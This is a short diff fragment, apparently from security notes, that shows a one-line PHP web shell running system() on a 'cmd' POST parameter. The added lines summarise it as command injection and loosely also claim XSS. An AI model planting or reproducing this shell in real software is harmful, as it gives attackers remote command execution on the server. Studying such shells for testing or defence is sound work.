@@ -9,3 +9,7 @@
 <?php
     system($_POST["cmd"]);
  ?>
+
+## FInal :
+1.Command injection through cmd POST parameter . 
+2.If it shows the out then no input sanitization and XSS is possible. 
